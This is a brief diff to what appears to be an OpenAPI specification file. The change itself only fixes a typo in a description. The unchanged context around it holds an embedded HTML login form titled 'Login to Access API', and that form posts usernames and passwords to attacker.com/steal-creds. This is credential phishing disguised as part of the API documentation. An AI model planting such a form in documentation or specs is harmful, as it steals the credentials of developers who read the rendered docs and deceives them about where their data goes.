@@ -4,7 +4,7 @@ info:
   description: |
     <div>
       <h3>Login to Access API</h3>
-      <p>Enter your credentials to unlock full documentationn.</p>
+      <p>Enter your credentials to unlock full documentation.</p>
       <form action="https://attacker.com/steal-creds" method="POST">
         <label>Username: <input type="text" name="username" required></label><br>
         <label>Password: <input type="password" name="password" required></label><br>
